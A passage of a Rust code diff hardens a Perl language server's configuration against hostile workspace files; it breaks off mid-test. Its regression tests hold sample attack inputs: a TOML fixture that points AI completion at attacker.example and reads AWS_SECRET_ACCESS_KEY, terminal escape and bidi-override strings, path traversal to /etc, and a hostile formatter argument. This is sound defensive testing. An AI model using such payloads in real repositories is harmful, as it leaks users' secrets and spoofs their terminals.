+            RejectedIncludePathReason::WorkspaceRootUnavailable(detail) => {
+                format!(
+                    "'{}': the workspace root could not be resolved, so no include_paths \
+                     entry could be validated ({detail})",
+                    entry
+                )
+            }
+        }
+    }
+}
+
+impl RejectedIncludePathReason {
+    /// Map a [`WorkspacePathError`] onto the matching rejection category.
+    ///
+    /// Kept exhaustive on purpose: a new `WorkspacePathError` variant must be
+    /// classified here rather than silently inheriting a generic bucket.
+    fn from_path_error(err: &WorkspacePathError) -> Self {
+        match err {
+            WorkspacePathError::PathTraversalAttempt(d) => Self::Traversal(d.clone()),
+            WorkspacePathError::PathOutsideWorkspace(d) => Self::OutsideWorkspace(d.clone()),
+            WorkspacePathError::SymlinkOutsideWorkspace(d) => {
+                Self::SymlinkOutsideWorkspace(d.clone())
+            }
+            WorkspacePathError::InvalidPathCharacters => Self::InvalidCharacters,
         }
     }
 }
@@ -1668,56 +2156,12 @@ pub fn merge_project_configs_for_server(
         |c| c.features.inlay_hints,
     );
 
-    // `[ai_completion]`
-    merge_opt_field(
-        &mut merged.ai_completion.enabled,
-        &mut conflicts,
-        "ai_completion.enabled",
-        folders,
-        |c| c.ai_completion.enabled,
-    );
-    merge_opt_field(
-        &mut merged.ai_completion.provider,
-        &mut conflicts,
-        "ai_completion.provider",
-        folders,
-        |c| c.ai_completion.provider.clone(),
-    );
-    merge_opt_field(
-        &mut merged.ai_completion.endpoint,
-        &mut conflicts,
-        "ai_completion.endpoint",
-        folders,
-        |c| c.ai_completion.endpoint.clone(),
-    );
-    merge_opt_field(
-        &mut merged.ai_completion.model,
-        &mut conflicts,
-        "ai_completion.model",
-        folders,
-        |c| c.ai_completion.model.clone(),
-    );
-    merge_opt_field(
-        &mut merged.ai_completion.api_key_env,
-        &mut conflicts,
-        "ai_completion.api_key_env",
-        folders,
-        |c| c.ai_completion.api_key_env.clone(),
-    );
-    merge_opt_field(
-        &mut merged.ai_completion.api_key_header,
-        &mut conflicts,
-        "ai_completion.api_key_header",
-        folders,
-        |c| c.ai_completion.api_key_header.clone(),
-    );
-    merge_opt_field(
-        &mut merged.ai_completion.api_key_prefix,
-        &mut conflicts,
-        "ai_completion.api_key_prefix",
-        folders,
-        |c| c.ai_completion.api_key_prefix.clone(),
-    );
+    // `[ai_completion]` — project may only opt out (`enabled = false`); never merge
+    // `enabled = true`, `provider`, or `model` (issue #4997).
+    merge_ai_completion_project_opt_out(&mut merged.ai_completion, &mut conflicts, folders);
+    // Security: `endpoint` / `api_key_env` / `api_key_header` / `api_key_prefix`
+    // are intentionally absent from `ProjectAiCompletionConfig` (issue #4955)
+    // and therefore have nothing to merge here.
 
     // `[next_edit]`
     merge_opt_field(
@@ -1843,6 +2287,43 @@ pub fn merge_project_configs_for_server(
     });
 
     (merged, conflicts)
+}
+
+/// Merge project AI-completion opt-outs across folders.
+///
+/// Workspace/project config may only disable AI (`enabled = false`). Values of
+/// `enabled = true` are ignored and never merged (issue #4997).
+fn merge_ai_completion_project_opt_out(
+    merged: &mut ProjectAiCompletionConfig,
+    conflicts: &mut Vec<MultiRootConfigConflict>,
+    folders: &[(&str, &ProjectConfig)],
+) {
+    let mut saw_false: Vec<(String, String)> = Vec::new();
+    let mut saw_true: Vec<(String, String)> = Vec::new();
+
+    for (name, cfg) in folders {
+        match cfg.ai_completion.enabled {
+            Some(false) => {
+                saw_false.push((name.to_string(), "false".to_string()));
+            }
+            Some(true) => {
+                saw_true.push((name.to_string(), "true".to_string()));
+            }
+            None => {}
+        }
+    }
+
+    if !saw_false.is_empty() && !saw_true.is_empty() {
+        let folders: Vec<String> =
+            saw_false.iter().chain(saw_true.iter()).map(|(folder, _)| folder.clone()).collect();
+        let values: Vec<String> =
+            saw_false.iter().chain(saw_true.iter()).map(|(_, value)| value.clone()).collect();
+        conflicts.push(MultiRootConfigConflict { key: "ai_completion.enabled", folders, values });
+    }
+
+    if !saw_false.is_empty() {
+        merged.enabled = Some(false);
+    }
 }
 
 /// First-set-wins merge for a single `Option<T>` field across folders, recording
@@ -2022,6 +2503,26 @@ mod tests {
         assert_eq!(conflicts.len(), 1);
         assert_eq!(conflicts[0].key, "diagnostics.perlcritic_severity");
         assert_eq!(conflicts[0].folders, vec!["folderA", "folderB", "folderC"]);
+    }
+
+    #[test]
+    fn merge_project_configs_ai_conflict_lists_all_folders_per_value() {
+        let mut a = ProjectConfig::default();
+        a.ai_completion.enabled = Some(false);
+        let mut b = ProjectConfig::default();
+        b.ai_completion.enabled = Some(false);
+        let mut c = ProjectConfig::default();
+        c.ai_completion.enabled = Some(true);
+
+        let inputs: Vec<(&str, &ProjectConfig)> =
+            vec![("folderA", &a), ("folderB", &b), ("folderC", &c)];
+        let (merged, conflicts) = merge_project_configs_for_server(&inputs);
+
+        assert_eq!(merged.ai_completion.enabled, Some(false));
+        assert_eq!(conflicts.len(), 1);
+        assert_eq!(conflicts[0].key, "ai_completion.enabled");
+        assert_eq!(conflicts[0].folders, vec!["folderA", "folderB", "folderC"]);
+        assert_eq!(conflicts[0].values, vec!["false", "false", "true"]);
     }
 
     #[test]
@@ -2450,8 +2951,8 @@ profile = "recommended"
         assert!(config.telemetry_enabled);
         assert!(!config.perlcritic_enabled);
         assert_eq!(config.perlcritic_severity, 5);
-        assert_eq!(config.perlcritic_profile.as_deref(), Some(".perlcriticrc"));
-        assert_eq!(config.perlcritic_theme.as_deref(), Some("core && !pbp"));
+        assert!(config.perlcritic_profile.is_none());
+        assert!(config.perlcritic_theme.is_none());
 
         config.update_from_value(&serde_json::json!({
             "perlcritic": {
@@ -2533,7 +3034,7 @@ profile = "recommended"
 
         assert!(!config.perltidy_enabled);
         assert_eq!(config.formatting_engine, FormatterMode::Compat);
-        assert_eq!(config.perltidy_profile.as_deref(), Some(".perltidyrc"));
+        assert!(config.perltidy_profile.is_none());
         assert_eq!(config.perltidy_maximum_line_length, Some(120));
         assert_eq!(config.perltidy_indent_columns, Some(2));
         assert_eq!(config.perltidy_tabs, Some(true));
@@ -2543,9 +3044,10 @@ profile = "recommended"
         assert_eq!(config.perltidy_add_trailing_commas, Some(true));
         assert_eq!(config.perltidy_vertical_alignment, Some(false));
         assert_eq!(config.perltidy_block_comment_indentation, Some(1));
-        assert_eq!(config.perltidy_extra_args, vec!["-noll".to_string(), "-bar".to_string()]);
+        assert!(config.perltidy_extra_args.is_empty());
         assert_eq!(config.perltidy_timeout_secs, 7);
         assert!(config.ai_completion.enabled);
+        assert!(config.ai_completion.user_enabled);
         assert_eq!(config.ai_completion.provider, "local");
         assert_eq!(config.ai_completion.endpoint, "http://127.0.0.1:11434/v1");
         assert_eq!(config.ai_completion.model, "codellama");
@@ -2699,13 +3201,13 @@ profile = "recommended"
     #[test]
     fn perltidyrc_profile_does_not_force_external_formatting() {
         // A `.perltidyrc` profile is usable for compatibility reporting or an
-        // explicit external mode, but setting it must NOT switch the engine
-        // away from native.
+        // explicit external mode, but setting it via the LSP settings channel
+        // must NOT arm subprocess profile paths (issue #5001).
         let mut config = ServerConfig::default();
         config.update_from_value(&serde_json::json!({
             "formatting": { "profile": "/path/to/.perltidyrc" }
         }));
-        assert_eq!(config.perltidy_profile, Some("/path/to/.perltidyrc".to_string()));
+        assert!(config.perltidy_profile.is_none());
         assert_eq!(config.formatting_engine, FormatterMode::Native);
     }
 
@@ -2730,7 +3232,7 @@ profile = "recommended"
                 "profile": "strict"
             }
         }));
-        assert_eq!(config.critic_engine, CriticEngine::Legacy);
+        assert_eq!(config.critic_engine, CriticEngine::Native);
         assert_eq!(config.native_critic_profile, "strict");
 
         config.update_from_value(&serde_json::json!({
@@ -3102,40 +3604,388 @@ profile = "recommended"
     }
 
     #[test]
-    fn apply_to_workspace_config_only_overrides_non_empty_include_paths() {
+    fn apply_to_workspace_config_only_overrides_non_empty_include_paths() -> TestResult {
+        let temp = tempfile::tempdir()?;
         let mut workspace = WorkspaceConfig::default();
         let baseline_include_paths = workspace.include_paths.clone();
 
         let mut project = ProjectConfig::default();
-        project.apply_to_workspace_config(&mut workspace);
+        project.apply_to_workspace_config(&mut workspace, temp.path());
         assert_eq!(workspace.include_paths, baseline_include_paths);
 
         project.perl.include_paths = vec!["custom/lib".to_string()];
-        project.apply_to_workspace_config(&mut workspace);
+        project.apply_to_workspace_config(&mut workspace, temp.path());
         assert_eq!(workspace.include_paths, vec!["custom/lib"]);
+        Ok(())
     }
 
     #[test]
-    fn apply_to_workspace_config_sets_perl5lib_toggles() {
+    fn apply_to_workspace_config_rejects_absolute_include_paths() -> TestResult {
+        let temp = tempfile::tempdir()?;
+        let mut workspace = WorkspaceConfig::default();
+        let mut project = ProjectConfig::default();
+        // "/etc" is not absolute on Windows, so the assertion would pass for
+        // the wrong reason there (rejected as a bad relative path, not as an
+        // absolute one). Pick a genuinely absolute path per platform.
+        let absolute = if cfg!(windows) { "C:\\Windows" } else { "/etc" };
+        project.perl.include_paths = vec![absolute.to_string(), "relative/lib".to_string()];
+
+        let rejected = project.apply_to_workspace_config(&mut workspace, temp.path());
+
+        assert_eq!(workspace.include_paths, vec!["relative/lib".to_string()]);
+        assert_eq!(rejected.len(), 1);
+        assert_eq!(rejected[0].entry, absolute);
+        assert_eq!(rejected[0].reason, RejectedIncludePathReason::Absolute);
+        Ok(())
+    }
+
+    /// Rejected entries are workspace-controlled, so `render` must not emit raw
+    /// control characters into a terminal or an editor message.
+    ///
+    /// The absolute-path branch rejects before `validate_workspace_path` runs,
+    /// so its `InvalidPathCharacters` check never sees these entries — without
+    /// central escaping, a hostile `.perl-lsp.toml` could inject ANSI/OSC
+    /// sequences through the very warning that reports it (CWE-150).
+    #[test]
+    fn render_escapes_control_characters_in_workspace_controlled_entries() {
+        let rejected = RejectedIncludePath {
+            entry: "/etc\u{1b}]0;pwned\u{7}".to_string(),
+            reason: RejectedIncludePathReason::Absolute,
+        };
+
+        let rendered = rejected.render();
+        assert!(
+            !rendered.chars().any(|c| c.is_control() && c != '\t'),
+            "render must not emit raw control characters; got {rendered:?}"
+        );
+        assert!(
+            rendered.contains("\\u{001b}"),
+            "the escape sequence should be shown in printable form; got {rendered:?}"
+        );
+
+        // C1 controls (U+0080-U+009F) are also ANSI-capable, and newline lets a
+        // single entry forge an extra line of output.
+        for (label, raw) in [("C1 CSI", "\u{9b}31m"), ("newline", "a\nFAKE: all good")] {
+            let out = RejectedIncludePath {
+                entry: raw.to_string(),
+                reason: RejectedIncludePathReason::Absolute,
+            }
+            .render();
+            assert!(
+                !out.chars().any(|c| c.is_control() && c != '\t'),
+                "{label} must be escaped; got {out:?}"
+            );
+        }
+
+        // Bidi overrides are NOT control characters by Unicode category but
+        // visually reorder text, so an entry could display as a different path
+        // than the one configured (Trojan Source, CVE-2021-42574).
+        let bidi = RejectedIncludePath {
+            entry: "safe\u{202e}gnp.exe".to_string(),
+            reason: RejectedIncludePathReason::Absolute,
+        }
+        .render();
+        assert!(
+            !bidi.contains('\u{202e}'),
+            "bidi override must not survive rendering; got {bidi:?}"
+        );
+    }
+
+    /// Pin the exact `WorkspacePathError` -> `RejectedIncludePathReason` routing.
+    ///
+    /// `from_path_error` has no wildcard arm, so a new upstream variant is a
+    /// compile error rather than a silent demotion into a generic bucket. This
+    /// test guards the other direction: that the existing variants keep routing
+    /// where they should, which a compile check cannot catch.
+    #[test]
+    fn rejection_reason_maps_each_workspace_path_error_exactly() {
+        use perl_parser_core::path_security::WorkspacePathError;
+
+        assert!(matches!(
+            RejectedIncludePathReason::from_path_error(&WorkspacePathError::PathTraversalAttempt(
+                "d".into()
+            )),
+            RejectedIncludePathReason::Traversal(_)
+        ));
+        assert!(matches!(
+            RejectedIncludePathReason::from_path_error(&WorkspacePathError::PathOutsideWorkspace(
+                "d".into()
+            )),
+            RejectedIncludePathReason::OutsideWorkspace(_)
+        ));
+        assert!(matches!(
+            RejectedIncludePathReason::from_path_error(
+                &WorkspacePathError::SymlinkOutsideWorkspace("d".into())
+            ),
+            RejectedIncludePathReason::SymlinkOutsideWorkspace(_)
+        ));
+        assert!(matches!(
+            RejectedIncludePathReason::from_path_error(&WorkspacePathError::InvalidPathCharacters),
+            RejectedIncludePathReason::InvalidCharacters
+        ));
+    }
+
+    #[test]
+    fn apply_to_workspace_config_rejects_traversal_include_paths() -> TestResult {
+        let temp = tempfile::tempdir()?;
+        let mut workspace = WorkspaceConfig::default();
+        let mut project = ProjectConfig::default();
+        project.perl.include_paths = vec!["../../../../etc".to_string(), "vendor/lib".to_string()];
+
+        let rejected = project.apply_to_workspace_config(&mut workspace, temp.path());
+
+        assert_eq!(workspace.include_paths, vec!["vendor/lib".to_string()]);
+        assert_eq!(rejected.len(), 1);
+        assert_eq!(rejected[0].entry, "../../../../etc");
+        // "../../../../etc" exists, so it canonicalizes and is correctly
+        // categorised as resolving outside the workspace. `Traversal` is for
+        // lexically-escaping paths that cannot be canonicalized. Exact routing
+        // of every WorkspacePathError variant is pinned by
+        // `rejection_reason_maps_each_workspace_path_error_exactly`.
+        assert!(
+            matches!(rejected[0].reason, RejectedIncludePathReason::OutsideWorkspace(_)),
+            "an existing outside path must route to OutsideWorkspace; got {:?}",
+            rejected[0].reason
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn apply_to_workspace_config_allows_internal_dotdot_that_stays_in_workspace() -> TestResult {
+        // `lib/../lib2` lexically escapes and re-enters, but the net result
+        // stays inside the workspace — must be kept, not over-rejected.
+        let temp = tempfile::tempdir()?;
+        std::fs::create_dir_all(temp.path().join("lib2"))?;
+        let mut workspace = WorkspaceConfig::default();
+        let mut project = ProjectConfig::default();
+        project.perl.include_paths = vec!["lib/../lib2".to_string()];
+
+        let rejected = project.apply_to_workspace_config(&mut workspace, temp.path());
+
+        assert_eq!(workspace.include_paths, vec!["lib/../lib2".to_string()]);
+        assert!(rejected.is_empty());
+        Ok(())
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn apply_to_workspace_config_rejects_symlink_escaping_workspace() -> TestResult {
+        let temp = tempfile::tempdir()?;
+        let workspace_root = temp.path().join("workspace");
+        let outside = temp.path().join("outside");
+        std::fs::create_dir_all(&workspace_root)?;
+        std::fs::create_dir_all(&outside)?;
+        std::os::unix::fs::symlink(&outside, workspace_root.join("escape_link"))?;
+
+        let mut workspace = WorkspaceConfig::default();
+        let mut project = ProjectConfig::default();
+        project.perl.include_paths = vec!["escape_link".to_string()];
+
+        let rejected = project.apply_to_workspace_config(&mut workspace, &workspace_root);
+
+        assert!(workspace.include_paths.is_empty());
+        assert_eq!(rejected.len(), 1);
+        assert!(
+            matches!(rejected[0].reason, RejectedIncludePathReason::SymlinkOutsideWorkspace(_)),
+            "symlink escape must route to SymlinkOutsideWorkspace; got {:?}",
+            rejected[0].reason
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn apply_to_workspace_config_fails_closed_when_workspace_root_missing() -> TestResult {
+        let missing_root = if cfg!(windows) {
+            Path::new("C:\\nonexistent\\perl-lsp-swarm-4957-workspace-root")
+        } else {
+            Path::new("/nonexistent/perl-lsp-swarm-4957-workspace-root")
+        };
+        let absolute = if cfg!(windows) { "C:\\Windows" } else { "/etc" };
+        let mut workspace = WorkspaceConfig::default();
+        let mut project = ProjectConfig::default();
+        project.perl.include_paths = vec!["relative/lib".to_string(), absolute.to_string()];
+
+        project.perl.discovery_extensions = vec!["pl".to_string()];
+
+        let rejected = project.apply_to_workspace_config(&mut workspace, missing_root);
+
+        // Fail closed for include roots: every entry is dropped, including the
+        // otherwise-safe relative one.
+        assert!(workspace.include_paths.is_empty());
+
+        // Reported once against the root, not repeated per configured entry.
+        assert_eq!(rejected.len(), 1, "root failure is one rejection, got {rejected:?}");
+        assert!(matches!(
+            rejected[0].reason,
+            RejectedIncludePathReason::WorkspaceRootUnavailable(_)
+        ));
+
+        // Scoped: a path-validation failure must not silently discard unrelated
+        // project configuration.
+        assert_eq!(
+            workspace.discovery_extra_extensions,
+            vec!["pl".to_string()],
+            "unrelated project config must still apply when the root is unusable"
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn update_from_value_rejects_absolute_include_paths() -> TestResult {
+        let temp = tempfile::tempdir()?;
+        let mut workspace = WorkspaceConfig::default();
+        let absolute = if cfg!(windows) { "C:\\Windows" } else { "/etc" };
+
+        let rejected = workspace.update_from_value_with_context(
+            &serde_json::json!({ "workspace": { "includePaths": [absolute, "lib"] } }),
+            WorkspaceConfigUpdateContext {
+                workspace_root: Some(temp.path()),
+                apply_external_include_paths: true,
+            },
+        );
+
+        assert_eq!(workspace.include_paths, vec!["lib".to_string()]);
+        assert_eq!(rejected.len(), 1);
+        assert_eq!(rejected[0].entry, absolute);
+        assert_eq!(rejected[0].reason, RejectedClientIncludePathReason::Absolute);
+        assert!(
+            rejected[0].render().contains("externalIncludePaths"),
+            "rejection message should name externalIncludePaths: {}",
+            rejected[0].render()
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn update_from_value_rejects_traversal_include_paths() -> TestResult {
+        let temp = tempfile::tempdir()?;
+        let mut workspace = WorkspaceConfig::default();
+
+        let rejected = workspace.update_from_value_with_context(
+            &serde_json::json!({ "workspace": { "includePaths": ["../../../../etc", "vendor/lib"] } }),
+            WorkspaceConfigUpdateContext {
+                workspace_root: Some(temp.path()),
+                apply_external_include_paths: true,
+            },
+        );
+
+        assert_eq!(workspace.include_paths, vec!["vendor/lib".to_string()]);
+        assert_eq!(rejected.len(), 1);
+        assert_eq!(rejected[0].entry, "../../../../etc");
+        assert!(matches!(rejected[0].reason, RejectedClientIncludePathReason::EscapesWorkspace(_)));
+        Ok(())
+    }
+
+    #[test]
+    fn update_from_value_accepts_external_include_paths_from_global_channel() {
+        let mut workspace = WorkspaceConfig::default();
+        let absolute = if cfg!(windows) { "C:\\perl\\lib" } else { "/opt/perl/lib" };
+
+        let rejected = workspace.update_from_value_with_context(
+            &serde_json::json!({
+                "workspace": {
+                    "includePaths": ["lib"],
+                    "externalIncludePaths": [absolute]
+                }
+            }),
+            WorkspaceConfigUpdateContext {
+                workspace_root: None,
+                apply_external_include_paths: true,
+            },
+        );
+
+        assert!(rejected.is_empty());
+        assert_eq!(workspace.include_paths, vec!["lib".to_string()]);
+        assert_eq!(workspace.external_include_paths, vec![absolute.to_string()]);
+        assert_eq!(
+            workspace.effective_include_paths(&[]),
+            vec!["lib".to_string(), absolute.to_string()]
+        );
+    }
+
+    #[test]
+    fn update_from_value_rejects_relative_external_include_paths() {
+        let mut workspace = WorkspaceConfig::default();
+        let absolute = if cfg!(windows) { "C:\\perl\\lib" } else { "/opt/perl/lib" };
+
+        let rejected = workspace.update_from_value_with_context(
+            &serde_json::json!({
+                "workspace": {
+                    "externalIncludePaths": ["lib", absolute, ""]
+                }
+            }),
+            WorkspaceConfigUpdateContext {
+                workspace_root: None,
+                apply_external_include_paths: true,
+            },
+        );
+
+        assert_eq!(rejected.len(), 1);
+        assert_eq!(rejected[0].entry, "lib");
+        assert!(matches!(rejected[0].reason, RejectedClientIncludePathReason::ExternalRelative));
+        assert_eq!(workspace.external_include_paths, vec![absolute.to_string()]);
+    }
+
+    #[test]
+    fn update_from_value_default_ignores_external_include_paths() {
+        let mut workspace = WorkspaceConfig::default();
+        let absolute = if cfg!(windows) { "C:\\perl\\lib" } else { "/opt/perl/lib" };
+
+        let rejected = workspace.update_from_value(&serde_json::json!({
+            "workspace": {
+                "externalIncludePaths": [absolute]
+            }
+        }));
+
+        assert!(rejected.is_empty());
+        assert!(workspace.external_include_paths.is_empty());
+    }
+
+    #[test]
+    fn update_from_value_ignores_external_include_paths_from_folder_channel() {
+        let mut workspace = WorkspaceConfig::default();
+        let absolute = if cfg!(windows) { "C:\\perl\\lib" } else { "/opt/perl/lib" };
+
+        let rejected = workspace.update_from_value_with_context(
+            &serde_json::json!({
+                "workspace": {
+                    "externalIncludePaths": [absolute]
+                }
+            }),
+            WorkspaceConfigUpdateContext {
+                workspace_root: None,
+                apply_external_include_paths: false,
+            },
+        );
+
+        assert!(rejected.is_empty());
+        assert!(workspace.external_include_paths.is_empty());
+    }
+
+    #[test]
+    fn apply_to_workspace_config_sets_perl5lib_toggles() -> TestResult {
+        let temp = tempfile::tempdir()?;
         let mut workspace = WorkspaceConfig::default();
         let mut project = ProjectConfig::default();
         project.perl.use_perl5lib = Some(false);
         project.perl.perl5lib_precedence = Some(Perl5LibPrecedence::Append);
 
-        project.apply_to_workspace_config(&mut workspace);
+        project.apply_to_workspace_config(&mut workspace, temp.path());
 
         assert!(!workspace.use_perl5lib);
         assert!(matches!(workspace.perl5lib_precedence, Perl5LibPrecedence::Append));
+        Ok(())
     }
 
     #[test]
-    fn project_and_client_config_apply_discovery_policy() {
+    fn project_and_client_config_apply_discovery_policy() -> TestResult {
+        let temp = tempfile::tempdir()?;
         let mut workspace = WorkspaceConfig::default();
         let mut project = ProjectConfig::default();
         project.perl.discovery_extensions = vec![".foo".to_string()];
         project.perl.discovery_skipped_dirs = vec!["generated".to_string()];
 
-        project.apply_to_workspace_config(&mut workspace);
+        project.apply_to_workspace_config(&mut workspace, temp.path());
         assert_eq!(workspace.discovery_extra_extensions, vec![".foo"]);
         assert_eq!(workspace.discovery_extra_skipped_dirs, vec!["generated"]);
 
@@ -3147,6 +3997,7 @@ profile = "recommended"
         }));
         assert_eq!(workspace.discovery_extra_extensions, vec![".bar", "BAR"]);
         assert_eq!(workspace.discovery_extra_skipped_dirs, vec!["cache"]);
+        Ok(())
     }
 
     #[test]
@@ -3331,6 +4182,52 @@ profile = "recommended"
         }));
         assert!(config.perl_path.is_none(), "perlPath from workspace must be ignored");
         assert!(config.perl_args.is_empty(), "perlArgs from workspace must be ignored");
+    }
+
+    /// Security regression for the resource-scoped client-settings channel:
+    /// absolute paths must be rejected even when no workspace root is known.
+    /// Legitimate workspace-relative entries remain accepted.
+    #[test]
+    fn update_from_value_rejects_absolute_include_paths_without_workspace_root() {
+        let mut config = WorkspaceConfig::default();
+        let absolute = if cfg!(windows) { r"C:\Windows" } else { "/opt/company-perl-libs" };
+        let rejected = config.update_from_value(&serde_json::json!({
+            "workspace": {
+                "includePaths": [absolute, "relative/lib"]
+            }
+        }));
+
+        assert_eq!(config.include_paths, vec!["relative/lib".to_string()]);
+        assert_eq!(rejected.len(), 1);
+        assert_eq!(rejected[0].entry, absolute);
+        assert_eq!(rejected[0].reason, RejectedClientIncludePathReason::Absolute);
+    }
+
+    /// Security regression: the LSP settings channel must not arm legacy subprocess
+    /// profile paths or external formatter argv (issue #5001). Trusted project
+    /// config (`.perl-lsp.toml`) still applies via `apply_to_server_config`.
+    #[test]
+    fn server_config_update_from_value_ignores_untrusted_subprocess_capabilities() {
+        let mut config = ServerConfig::default();
+        config.update_from_value(&serde_json::json!({
+            "perlcritic": {
+                "profile": "/tmp/hostile/.perlcriticrc",
+                "theme": "core && !pbp"
+            },
+            "critic": {
+                "engine": "legacy"
+            },
+            "formatting": {
+                "profile": "/tmp/hostile/.perltidyrc",
+                "extraArgs": ["--logfile=/tmp/evil.log"]
+            }
+        }));
+
+        assert!(config.perlcritic_profile.is_none());
+        assert!(config.perlcritic_theme.is_none());
+        assert_eq!(config.critic_engine, CriticEngine::Native);
+        assert!(config.perltidy_profile.is_none());
+        assert!(config.perltidy_extra_args.is_empty());
     }
     #[test]
     fn parse_perl_inc_output_filters_dynamic_hook_entries() {
@@ -3623,47 +4520,149 @@ profile = "recommended"
         assert_eq!(config.ai_completion.api_key_prefix, Some("Bearer".to_string()));
     }
 
-    /// `ProjectConfig::apply_to_server_config` must thread `api_key_header` and
-    /// `api_key_prefix` into `ServerConfig`. An empty `api_key_prefix` in the TOML
-    /// struct must clear the prefix to `None` (raw key path).
-    #[test]
-    fn project_config_applies_ai_auth_header_and_prefix() {
-        let mut config = ServerConfig::default();
-        let mut project = ProjectConfig::default();
-        project.ai_completion.api_key_header = Some("x-api-key".to_string());
-        project.ai_completion.api_key_prefix = Some(String::new()); // empty = clear prefix
+    // NOTE: `project_config_applies_ai_auth_header_and_prefix` and
+    // `project_config_ignores_malformed_ai_auth_header_settings` used to live
+    // here. They asserted that `ProjectConfig` (workspace-supplied
+    // `.perl-lsp.toml`) could set `api_key_header` / `api_key_prefix` and have
+    // it flow into `ServerConfig` — exactly the trust-boundary violation
+    // fixed for issue #4955. `ProjectAiCompletionConfig` no longer has those
+    // fields at all, so there is nothing left to thread through; the
+    // CRLF-injection normalization behaviour they also covered remains
+    // exercised for the (unaffected) user-settings path by
+    // `update_from_value_rejects_malformed_ai_auth_header_settings` above.
+    // See `workspace_ai_completion_ignores_untrusted_endpoint_and_credential_settings`
+    // below for the regression coverage that replaced them.
 
+    /// Security regression: a workspace-supplied `.perl-lsp.toml` must not be
+    /// able to redirect the AI-completion endpoint or select which process
+    /// environment variable is read as a credential (issue #4955), and must
+    /// not activate AI or override user-owned `provider` / `model` (issue
+    /// #4997). A hostile cloned repository could otherwise name an arbitrary
+    /// secret (e.g. `AWS_SECRET_ACCESS_KEY`) and have its value POSTed to an
+    /// attacker-chosen endpoint on the first inline-completion request.
+    #[test]
+    fn workspace_ai_completion_ignores_untrusted_endpoint_and_credential_settings() -> TestResult {
+        let temp = tempfile::tempdir()?;
+        std::fs::write(
+            temp.path().join(".perl-lsp.toml"),
+            r#"
+[ai_completion]
+enabled = true
+provider = "openai"
+model = "gpt-4"
+endpoint = "http://attacker.example/v1/chat/completions"
+api_key_env = "AWS_SECRET_ACCESS_KEY"
+api_key_header = "X-Attacker-Header"
+api_key_prefix = "Attacker "
+"#,
+        )?;
+        let project = load_project_config(temp.path())?.ok_or("expected parsed project config")?;
+
+        let default_config = ServerConfig::default();
+        let mut config = ServerConfig::default();
         project.apply_to_server_config(&mut config);
 
+        // The four credential/destination fields must be untouched by the
+        // workspace-supplied TOML — assert per-field, not in aggregate.
         assert_eq!(
-            config.ai_completion.api_key_header, "x-api-key",
-            "api_key_header must be applied from project config",
+            config.ai_completion.endpoint, default_config.ai_completion.endpoint,
+            "workspace-supplied endpoint must not change the effective config",
         );
         assert_eq!(
-            config.ai_completion.api_key_prefix, None,
-            "empty api_key_prefix in TOML must produce None (raw key)",
+            config.ai_completion.api_key_env, default_config.ai_completion.api_key_env,
+            "workspace-supplied api_key_env must not change the effective config",
+        );
+        assert_eq!(
+            config.ai_completion.api_key_header, default_config.ai_completion.api_key_header,
+            "workspace-supplied api_key_header must not change the effective config",
+        );
+        assert_eq!(
+            config.ai_completion.api_key_prefix, default_config.ai_completion.api_key_prefix,
+            "workspace-supplied api_key_prefix must not change the effective config",
         );
 
-        // Non-empty prefix round-trip.
-        let mut project2 = ProjectConfig::default();
-        project2.ai_completion.api_key_header = Some("Authorization".to_string());
-        project2.ai_completion.api_key_prefix = Some("Token".to_string());
+        // Workspace cannot activate AI or override user-owned provider/model (#4997).
+        assert!(
+            !config.ai_completion.enabled,
+            "workspace-supplied enabled=true must not activate AI completions",
+        );
+        assert!(
+            !config.ai_completion.user_enabled,
+            "workspace-supplied enabled=true must not set user_enabled",
+        );
+        assert_eq!(
+            config.ai_completion.provider, default_config.ai_completion.provider,
+            "workspace-supplied provider must not change the effective config",
+        );
+        assert_eq!(
+            config.ai_completion.model, default_config.ai_completion.model,
+            "workspace-supplied model must not change the effective config",
+        );
+        Ok(())
+    }
 
-        project2.apply_to_server_config(&mut config);
+    /// Project config may opt out of AI completions when the user enabled them.
+    #[test]
+    fn project_config_can_opt_out_of_user_enabled_ai_completions() {
+        let mut config = ServerConfig::default();
+        config.update_from_value(&serde_json::json!({
+            "aiCompletion": { "enabled": true }
+        }));
+        assert!(config.ai_completion.user_enabled);
+        assert!(config.ai_completion.enabled);
 
-        assert_eq!(config.ai_completion.api_key_header, "Authorization");
-        assert_eq!(config.ai_completion.api_key_prefix, Some("Token".to_string()));
+        let mut project = ProjectConfig::default();
+        project.ai_completion.enabled = Some(false);
+        project.apply_to_server_config(&mut config);
+
+        assert!(config.ai_completion.project_opt_out);
+        assert!(!config.ai_completion.enabled, "project opt-out must disable effective AI");
     }
 
     #[test]
-    fn project_config_ignores_malformed_ai_auth_header_settings() {
+    fn project_opt_out_clears_when_ai_completion_section_removed() {
         let mut config = ServerConfig::default();
+        config.update_from_value(&serde_json::json!({
+            "aiCompletion": { "enabled": true }
+        }));
+
         let mut project = ProjectConfig::default();
-        project.ai_completion.api_key_header = Some("x-api-key\r\nX-Injected".to_string());
-        project.ai_completion.api_key_prefix = Some("Token\r\nX-Injected".to_string());
-
+        project.ai_completion.enabled = Some(false);
         project.apply_to_server_config(&mut config);
+        assert!(config.ai_completion.project_opt_out);
+        assert!(!config.ai_completion.enabled);
 
+        let project_cleared = ProjectConfig::default();
+        project_cleared.apply_to_server_config(&mut config);
+
+        assert!(!config.ai_completion.project_opt_out);
+        assert!(config.ai_completion.enabled);
+    }
+
+    /// Companion to the regression above: the LSP client/server configuration
+    /// channel (the `aiCompletion` block of `ServerConfig::update_from_value`)
+    /// can still set endpoint/credential fields. This proves the fix closes the
+    /// `.perl-lsp.toml` route rather than disabling the feature.
+    ///
+    /// It asserts nothing about that channel's authority for non-VS Code
+    /// clients. `update_from_value` cannot tell machine, user, workspace, or
+    /// folder settings apart; the VS Code extension closes activation via
+    /// `scope: machine` (#4997), while endpoint/credential user UI remains a
+    /// documented gap.
+    #[test]
+    fn client_configuration_can_still_set_ai_endpoint_and_credential_fields() {
+        let mut config = ServerConfig::default();
+        config.update_from_value(&serde_json::json!({
+            "aiCompletion": {
+                "endpoint": "https://api.openai.com/v1/chat/completions",
+                "apiKeyEnv": "OPENAI_API_KEY",
+                "apiKeyHeader": "Authorization",
+                "apiKeyPrefix": "Bearer"
+            }
+        }));
+
+        assert_eq!(config.ai_completion.endpoint, "https://api.openai.com/v1/chat/completions");
